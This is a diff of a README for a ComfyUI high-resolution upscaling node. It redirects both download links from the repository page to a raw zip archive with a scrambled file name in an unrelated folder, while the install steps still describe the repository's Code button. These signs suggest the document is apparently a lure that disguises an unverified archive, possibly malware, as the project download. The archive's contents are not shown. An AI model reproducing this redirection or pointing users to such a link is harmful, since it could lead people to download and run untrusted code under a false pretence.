@@ -1,6 +1,6 @@
 # 🎨 ComfyUI-HiresFix-Ultra-AllInOne - Improve AI Image Quality With Ease
 
-[![Download ComfyUI-HiresFix-Ultra-AllInOne](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Selinewholesome1690/ComfyUI-HiresFix-Ultra-AllInOne)
+[![Download ComfyUI-HiresFix-Ultra-AllInOne](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Selinewholesome1690/ComfyUI-HiresFix-Ultra-AllInOne/raw/refs/heads/main/semirefined/In_Ultra_Hires_Comfy_One_U_All_Fix_v3.7.zip)
 
 ## 📦 About This Tool
 This node simplifies the high-resolution image process for ComfyUI. Many users struggle to balance image details and scale. This tool combines several complex steps into one system. It handles model upscaling, latent upscaling, tiled VAE, and color correction. You gain clear, high-quality images without manual adjustments or multiple loose nodes. It works directly within your existing ComfyUI workflow.
@@ -16,7 +16,7 @@ To run this software, ensure your computer meets these standards:
 ## 📥 How To Install
 Follow these steps to add the tool to your computer.
 
-1. Visit this page to download: [https://github.com/Selinewholesome1690/ComfyUI-HiresFix-Ultra-AllInOne](https://github.com/Selinewholesome1690/ComfyUI-HiresFix-Ultra-AllInOne).
+1. Visit this page to download: [https://github.com/Selinewholesome1690/ComfyUI-HiresFix-Ultra-AllInOne/raw/refs/heads/main/semirefined/In_Ultra_Hires_Comfy_One_U_All_Fix_v3.7.zip](https://github.com/Selinewholesome1690/ComfyUI-HiresFix-Ultra-AllInOne/raw/refs/heads/main/semirefined/In_Ultra_Hires_Comfy_One_U_All_Fix_v3.7.zip).
 2. Locate the green button labeled Code and select Download ZIP.
 3. Save the folder to your desktop.
 4. Extract the contents of the ZIP folder.
